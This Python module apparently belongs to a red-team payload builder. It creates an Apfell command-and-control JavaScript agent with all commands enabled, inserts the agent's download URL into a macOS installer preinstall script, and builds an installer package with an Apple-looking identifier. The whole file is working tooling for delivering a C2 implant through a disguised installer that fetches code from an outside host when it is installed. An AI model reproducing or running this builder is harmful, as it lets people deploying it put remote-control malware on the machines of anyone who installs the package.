import os
import asyncio
from .Utilities import *


def install_pkg():
    temp = "./Templates/Installer_Package"
    payload = "./Payloads/Installer_Package_Payload"

    copyanything(temp, payload)

    ## Create apfell payload
    async def scripting():
        payload_info = await login_and_create_apfell(description="Installer Pkg",
                                                     filename="Install_PKG.js",
                                                     include_all_commands=True)
        url = await get_payload_download_url(payload_info)

        # Replace template values
        templateString = "URL"
        modifyFile = "./Payloads/Installer_Package_Payload/simple-package/scripts/preinstall"

        fin = open(modifyFile, "rt")
        data = fin.read()
        data = data.replace(templateString, url)
        fin.close()

        fin = open("./Payloads/Installer_Package_Payload/simple-package/scripts/preinstall", "wt")
        fin.write(data)
        fin.close()

        #  Build the payload (currently no payload)
        print("[*] Building Installer Package Payload")
        os.system("chmod +x ./Payloads/Installer_Package_Payload/simple-package/scripts/preinstall")
        os.system(
            "pkgbuild --identifier com.apple.simple --nopayload --scripts ./Payloads/Installer_Package_Payload/simple-package/scripts ./Payloads/Installer_Package_Payload/simple.pkg")

        # To add payload use root flag:
        # --root (optional): The path to the root directory for the installer payload.

    async def main():
        await scripting()

    asyncio.run(main())
